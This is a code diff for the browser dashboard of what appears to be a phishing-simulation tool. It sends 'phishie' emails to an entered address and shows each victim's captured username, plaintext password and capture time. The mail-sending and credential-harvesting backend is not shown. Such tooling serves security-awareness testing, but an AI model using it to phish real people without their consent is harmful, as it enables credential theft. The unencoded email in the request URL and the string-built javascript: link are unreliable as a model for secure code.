@@ -42,34 +42,88 @@
 			showLoading(emailValue, type);
 			$.ajax({
 				url: "process/send.php?email=" + emailValue + "&type=" + type
-			}).done(function(data) {
-				updateTickers();
-				if(swal.getState().isOpen == true) {
-					swal.close();
-				}
-				showSent(emailValue, type);
-				openTestWindow(emailValue, type);
-				$("#email-phish")[0].value = "";
+			}).done(function(emailId) {
+				setTimeout(function() {
+					updateTickers();
+					if(swal.getState().isOpen == true) {
+						swal.close();
+					}
+					showSent(emailValue, type, emailId);
+					//openTestWindow(emailId);
+					$("#email-phish")[0].value = "";
+				}, 3000);
 			});
 		}
 		
-		function openTestWindow(email, type) {
-			window.open("test.php?email=" + email + "&type=" + type, "_blank", "toolbar=0,location=0,menubar=0,height=200px,width=350px");
+		function openTestWindow(emailId) {
+			window.open("test.php?emailId=" + emailId, "_blank", "toolbar=0,location=0,menubar=0,height=730px,width=660px");
+		}
+
+		function openPhishWindow(username, password, emailId, timestamp) {
+			date = new Date(timestamp * 1000);
+			date = date.toLocaleString();
+			
+			usernameRow = document.createElement("tr");
+			usernameKey = document.createElement("td");
+			usernameKey.appendChild(document.createTextNode("Username:"));
+			usernameValue = document.createElement("td");
+			usernameValue.appendChild(document.createTextNode(username));
+			usernameRow.appendChild(usernameKey);
+			usernameRow.appendChild(usernameValue);
+			
+			passwordRow = document.createElement("tr");
+			passwordKey = document.createElement("td");
+			passwordKey.appendChild(document.createTextNode("Password:"));
+			passwordValue = document.createElement("td");
+			passwordValue.appendChild(document.createTextNode(password));
+			passwordRow.appendChild(passwordKey);
+			passwordRow.appendChild(passwordValue);
+			
+			emailIdRow = document.createElement("tr");
+			emailIdKey = document.createElement("td");
+			emailLink = document.createElement("a");
+			emailLink.href="javascript:openTestWindow('" + emailId + "');";
+			emailLink.appendChild(document.createTextNode(emailId));
+			emailIdKey.appendChild(document.createTextNode("Email ID:"));
+			emailIdValue = document.createElement("td");
+			emailIdValue.appendChild(emailLink);
+			emailIdRow.appendChild(emailIdKey);
+			emailIdRow.appendChild(emailIdValue);
+			
+			timestampRow = document.createElement("tr");
+			timestampKey = document.createElement("td");
+			timestampKey.appendChild(document.createTextNode("Caught on:"));
+			timestampValue = document.createElement("td");
+			timestampValue.appendChild(document.createTextNode(date));
+			timestampRow.appendChild(timestampKey);
+			timestampRow.appendChild(timestampValue);
+			
+			table = document.createElement("table");
+			table.appendChild(usernameRow);
+			table.appendChild(passwordRow);
+			table.appendChild(emailIdRow);
+			table.appendChild(timestampRow);
+			
+			swal({
+				'icon': "warning",
+				'title': "Phish Info:",
+				'content': table,
+			});
 		}
 		
 		function showEmailError(email) {
-			retText = "";
 			if(email == "") {
-				retText = "Please enter an email to send a phish.";
+				swal({
+					'title': 'Please enter an email to send a phish.',
+		            'icon': "error"
+				});
 			} else {
-				retText = "The email \"" + email + "\" is invalid.";
+				swal({
+					'title': 'The email you entered is invalid:',
+					'content': makeEmailTag(email),
+		            'icon': "error"
+				});
 			}
-			
-			swal({
-				'title': 'Invalid Email',
-	            'text': retText,
-	            'icon': "error"
-			});
 		}
 		
 		function validEmail(email) {
@@ -80,10 +134,18 @@
 			return false;
 		}
 		
+		function makeEmailTag(email) {
+			emailTag = document.createElement("p");
+			emailTag.classList.add("email");
+			emailTag.appendChild(document.createTextNode(email));
+			
+			return emailTag;
+		}
+		
 		function showLoading(email, type) {
 			swal({
-				'title': 'Sending...',
-	            'text': 'Your ' + type + ' phishie is swimming to \n' + email,
+				'title': 'Sending phishie to:',
+	            'content': makeEmailTag(email),
 	            'icon': "warning",
 	            'closeOnEsc': false,
 	            'closeOnClickOutside': false,
@@ -91,11 +153,27 @@
 			});
 		}
 				
-		function showSent(email, type) {
+		function showSent(email, type, emailId) {
 			swal({
-				'title': 'Sent',
-	            'text': 'Your ' + type + ' phishie has been sent to \n' + email,
-	            'icon': "success"
+	            'title': 'Phishie has been sent to:',
+	            'content': makeEmailTag(email),
+	            'icon': "success",
+	            'buttons': {
+					open: {
+			            text: "Open",
+			            value: "open",
+			            closeModal: false
+					},
+					confirm: {
+			            text: "OK",
+			            value: true,
+			            closeModal: true
+					}
+		        }
+			}).then((value) => {
+				if(value == "open") {
+					openTestWindow(emailId);
+				}
 			});
 		}
 		
@@ -117,7 +195,7 @@
 			emailValue = $("#email-phish")[0].value;
 
 			if(validEmail(emailValue)) {
-				swal("What phish would you like to catch?", {
+				/*swal("What phish would you like to catch?", {
 					buttons: {
 						cancel: "Cancel",
 						fb: {
@@ -139,7 +217,9 @@
 					}
 				}).then((value) => {
 					sendMail(value);
-				});
+				});*/
+				//do not support types currently, using only UNR
+				sendMail("unr");
 			} else {
 				showEmailError(emailValue);
 			}
